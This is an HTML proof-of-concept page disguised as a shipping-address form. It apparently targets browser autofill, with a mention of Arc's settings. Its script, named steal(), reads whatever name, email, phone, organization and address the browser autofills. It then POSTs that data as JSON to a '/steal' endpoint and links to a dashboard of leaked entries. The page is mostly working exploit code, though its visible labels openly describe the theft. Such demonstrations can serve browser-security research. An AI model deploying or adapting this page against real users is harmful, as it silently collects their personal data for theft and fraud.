<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Shipping Address</title>
<style>
body{font-family:system-ui;max-width:480px;margin:40px auto;padding:20px}
h1{font-size:1.1em;margin:0}
input{width:100%;padding:10px;margin:4px 0 12px;border:1px solid #ccc;border-radius:4px;font-size:14px}
label{font-size:12px;color:#555}
.btn{display:block;width:100%;padding:14px;font-size:14px;cursor:pointer;border:none;border-radius:6px;background:#0b5da7;color:#fff;margin:16px 0}
pre{background:#111;color:#0f0;padding:14px;font-size:11px;font-family:monospace;min-height:60px;max-height:360px;overflow:auto;white-space:pre-wrap}
.stolen{color:#ff6b6b;font-weight:bold}
</style>
</head>
<body>

<h1>Shipping Address</h1>
<p style="color:#888;font-size:13px">Please verify your shipping details.</p>

<form autocomplete="on">
  <label>Full Name</label>
  <input autocomplete="name" id="a0" placeholder="John Doe">
  <label>Email</label>
  <input autocomplete="email" id="a1" placeholder="john@example.com">
  <label>Phone</label>
  <input autocomplete="tel" id="a2" placeholder="+1 (555) 000-0000">
  <label>Organization</label>
  <input autocomplete="organization" id="a3" placeholder="Acme Inc.">
  <label>Street Address</label>
  <input autocomplete="street-address" id="a4" placeholder="123 Main St">
  <label>City</label>
  <input autocomplete="address-level2" id="a5" placeholder="New York">
  <label>State</label>
  <input autocomplete="address-level1" id="a6" placeholder="NY">
  <label>ZIP Code</label>
  <input autocomplete="postal-code" id="a7" placeholder="10001">
  <label>Country</label>
  <input autocomplete="country" id="a8" placeholder="US">
</form>

<button class="btn" onclick="steal()">▶ Continue to Payment</button>
<pre id="L">Click "Continue to Payment" to verify.
Attacker receives your saved autofill PII.</pre>

<script>
var L = function(m){ document.getElementById('L').textContent+=m+'\n'; };

async function steal(){
  L('');
  L('Extracting autofill data...');
  
  var fields = ['a0','a1','a2','a3','a4','a5','a6','a7','a8'];
  var labels = ['name','email','phone','organization','address','city','state','zip','country'];
  var pii = {};
  
  fields.forEach(function(id,i){
    var el = document.getElementById(id);
    el.focus();
    el.dispatchEvent(new Event('input',{bubbles:true}));
    var val = el.value.trim();
    if(val) pii[labels[i]] = val;
  });
  
  // Also capture URL (might contain PII)
  pii.page_url = location.href;
  pii.page_title = document.title;
  
  if(Object.keys(pii).length > 0){
    L('<span class="stolen">⚠️ PII EXTRACTED ('+Object.keys(pii).length+' fields)</span>');
    for(var k in pii){
      L('<span class="stolen">  '+k+': '+pii[k]+'</span>');
    }
    
    // SEND PII TO ATTACKER SERVER
    L('');
    L('Sending to attacker server...');
    try {
      var resp = await fetch(location.origin+'/steal', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify(pii)
      });
      var result = await resp.json();
      L('✓ PII successfully exfiltrated (ID: '+result.id+')');
      L('');
      L('View leaked PII: <a href="/dashboard" target="_blank" style="color:#0f0">Dashboard</a>');
    } catch(e) {
      L('✗ Exfiltration failed: '+e.message);
    }
  } else {
    L('No autofill data available.');
    L('To test: Arc → Settings → Autofill → Add address.');
  }
}
</script>
</body>
</html>
